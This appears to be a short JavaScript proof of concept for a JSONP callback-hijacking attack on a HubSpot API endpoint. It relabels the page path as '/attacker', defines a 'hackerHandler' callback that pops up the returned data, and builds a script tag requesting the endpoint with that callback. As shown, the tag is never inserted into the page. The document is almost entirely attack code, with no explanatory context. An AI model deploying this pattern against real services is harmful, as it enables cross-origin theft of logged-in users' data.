window.history.replaceState(null, '', '/attacker');

function hackerHandler(e) {
	alert(e);
}

o = document.createElement("script");
o.type = "text/javascript";
o.referrerPolicy = "no-referrer-when-downgrade";
o.async = !0;
o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=hackerHandler";


